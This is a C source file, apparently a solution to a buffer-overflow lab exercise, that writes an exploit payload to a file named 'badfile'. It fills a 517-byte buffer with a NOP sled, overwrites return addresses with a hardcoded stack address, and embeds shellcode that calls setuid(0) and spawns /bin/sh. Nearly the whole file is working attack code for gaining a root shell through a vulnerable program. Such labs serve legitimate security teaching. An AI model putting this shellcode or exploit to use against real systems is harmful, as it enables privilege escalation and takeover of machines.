/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
"\x31\xdb"             /* xor    %ebx,%ebx       */
"\x8d\x43\x17"         /* lea    0x17(%ebx),%eax */
"\xcd\x80"             /* int    $0x80           */
"\x53"                 /* push   %ebx            */
"\x68\x6e\x2f\x73\x68" /* push   $0x68732f6e     */
"\x68\x2f\x2f\x62\x69" /* push   $0x69622f2f     */
"\x89\xe3"             /* mov    %esp,%ebx       */
"\x50"                 /* push   %eax            */
"\x53"                 /* push   %ebx            */
"\x89\xe1"             /* mov    %esp,%ecx       */
"\x99"                 /* cltd                   */
"\xb0\x0b"             /* mov    $0xb,%al        */
"\xcd\x80";            /* int    $0x80           */


long get_esp(void)
{
__asm__("movl %esp,%eax\n");
}

void main(int argc, char **argv)
{  
    char buffer[517];
    FILE *badfile;
    long fcP;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
 
    /* You need to fill the buffer with appropriate contents here */
    printf("Size of shellcode: %d\n", sizeof(shellcode));
 
    /* Print stack pointer */
    fcP = 0xbffff380;
    printf ("Stack pointer addr: %x\n", fcP);

    memset(&buffer, 0x41, 16);

    fcP += 80;
    long addr = fcP;
    
    long *ptr = (long*)(buffer + 12);
    *(ptr) = addr;
    ptr = (long*)(buffer + 16);
    *(ptr) = addr;
    
    memcpy(&buffer[300], shellcode, sizeof(shellcode));

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
